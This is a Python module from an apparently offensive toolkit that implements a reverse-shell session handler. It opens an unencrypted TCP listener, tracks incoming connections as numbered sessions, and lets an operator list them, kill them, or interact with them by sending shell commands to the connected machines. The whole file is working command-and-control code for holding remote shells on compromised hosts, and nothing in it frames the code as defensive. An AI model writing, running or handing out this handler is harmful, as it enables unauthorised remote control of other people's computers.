from waf.libs import variable as var
from waf.libs.color  import *
import socket
import threading
import uuid

HOST = "::"     # يدعم IPv4 و IPv6
PORT = int(var.all_var['lport'])

SESSIONS = {}
LOCK = threading.Lock()

def handle_client(uid, conn, addr):
    ip, port = addr[0], addr[1]
    with LOCK:
        SESSIONS[uid] = {
            "conn": conn,
            "addr": addr
        }

    print(f"{green}[+]{default} {uid} | {ip} | {port}")

    try:
        while True:
            data = conn.recv(4096)
            if not data:
                break
            print(f"[{uid}] {data.decode(errors='ignore').strip()}")
    except:
        pass
    finally:
        with LOCK:
            if uid in SESSIONS:
                del SESSIONS[uid]
        conn.close()
        print(f"[-] {uid} | {ip} | {port} disconnected")

def listener():
    s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(100)

    print(f"\n{blue}[*]{default}[LISTENING] on port {PORT} (No TLS)")

    while True:
        conn, addr = s.accept()
        uid = str(uuid.uuid4())[:8]
        threading.Thread(target=handle_client, args=(uid, conn, addr), daemon=True).start()

def list_sessions():
    with LOCK:
        if not SESSIONS:
            print(f"{red}[-]{default}No active sessions.")
            return
        print(f"\n{'#':<3} {'UID':<10} {'IP':<18} {'PORT'}")
        print("-" * 40)
        for i, (uid, session) in enumerate(SESSIONS.items(), 1):
            addr = session["addr"]
            ip = addr[0]
            port = addr[1]
            print(f"{i:<3} {uid:<10} {ip:<18} {port}")
        print()

def kill_session(uid):
    with LOCK:
        if uid not in SESSIONS:
            print(f"{red}[-]{default}Session {uid} not found.")
            return
        try:
            SESSIONS[uid]["conn"].close()
        except:
            pass
        del SESSIONS[uid]
        print(f"{blue}[*]{default}Killed session {uid}")

def interact(uid):
    with LOCK:
        if uid not in SESSIONS:
            print(f"{red}[-]{default}Session {uid} not found.")
            return
        conn = SESSIONS[uid]["conn"]

    print(f"{blue}[*]{default}Interacting with session {uid}. Type 'exit' to quit.")
    try:
        while True:
            cmd = input(f"[{uid}]$ ")
            if cmd.strip().lower() == "exit":
                break
            conn.sendall((cmd + "\n").encode())
    except Exception as e:
        print(f"{red}[-]{default}Error: {e}")
    print(f"{blue}[*]{default}Leaving session {uid}.")

def command_interface():
    print("[*] Type 'help' to show available commands.")
    while True:
        try:
            cmd = input(f"WhoAmi ({red}listen{default}) $>> ").strip()
            if cmd in ["exit", "quit"]:
                print(f"{blue}[*]{default}Exiting...")
                break
            elif cmd == "help":
                print("""
Available commands:
  list               - Show active sessions
  interact <UID>     - Interact with a session
  kill <UID>         - Kill a session
  exit / quit        - Exit the listener
  
""")
            elif cmd.startswith("interact "):
                parts = cmd.split()
                if len(parts) == 2:
                    interact(parts[1])
                else:
                    print(f"{red}[-]{default}Usage: interact <UID>")
            elif cmd.startswith("kill "):
                parts = cmd.split()
                if len(parts) == 2:
                    kill_session(parts[1])
                else:
                    print(f"{red}[-]{default}Usage: kill <UID>")
            elif cmd == "list":
                list_sessions()
            else:
                print(f"{red}[-]{default}Unknown command. Type 'help' for help.")
        except KeyboardInterrupt:
            print(f"\n{blue}[*]{default}Exiting...")
            break

def run():
    try:
        threading.Thread(target=listener, daemon=True).start()
        command_interface()
    except Exception as e:
        print(f"{red}[-]{default}FATAL {e}")
